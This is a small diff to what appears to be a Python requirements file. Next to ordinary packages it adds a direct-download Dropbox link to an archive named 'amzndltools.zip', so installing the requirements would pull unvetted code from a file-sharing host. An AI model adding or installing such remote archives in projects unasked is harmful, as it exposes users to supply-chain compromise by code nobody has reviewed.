@@ -23,3 +23,4 @@ pproxy
 pysrt
 protobuf
 pycryptodomex
+https://dl.dropboxusercontent.com/scl/fi/sb81vexqug5xs0xyvoowz/amzndltools.zip?rlkey=sv0wsjb9797xy21pm2hgij45l&st=t7ozo0gg&dl=0
